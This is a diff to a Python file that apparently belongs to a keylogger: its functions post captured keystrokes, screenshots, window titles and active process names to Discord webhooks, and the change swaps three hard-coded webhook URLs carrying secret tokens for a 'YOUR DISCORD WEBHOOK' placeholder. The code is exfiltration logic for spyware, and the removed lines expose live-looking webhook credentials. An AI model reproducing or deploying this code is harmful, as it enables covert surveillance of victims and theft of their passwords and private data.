@@ -84,18 +84,18 @@ def get_active_process():
     return process_name
 
 def send_to_discord(key):
-    url = "https://discord.com/api/webhooks/1309903363550478356/7TzOHTOlo6VOoinI0TumhhqziTIU5yYISUqaqU8EXg2wPTGUhZackDCTcciTvdOZ_a5V"
+    url = YOUR DISCORD WEBHOOK
     data = {"content": key}
     requests.post(url, json=data)
 
 def send_to_discord2(screenshot):
     with open('screenshot.png', 'rb') as img_file:
-        url = "https://discord.com/api/webhooks/1310611632774189117/Oyh7gztcnUUZKRDnUH3JZ7_s1LSwJ41yhU6LJZ4eMsLUyQOkByyhE_ehCA1jWmqMSShY"
+        url = YOUR DISCORD WEBHOOK
         data = {"file": ('screenshot.png', img_file, "image/png")}
         requests.post(url, files=data)
 
 def send_to_discord3(window_title, process_name):
-    url = "https://discord.com/api/webhooks/1310932271590670336/3UXiWRf_Jq1HlKlw4qssPd8QKpF86EbOb2oR7rTTAhoMRFuwwKIBKt6zeWOWxV8gE7vp"
+    url = YOUR DISCORD WEBHOOK
     data = {"content" : f"{window_title}\nActive Process: {process_name}"}
     requests.post(url, json=data)
 
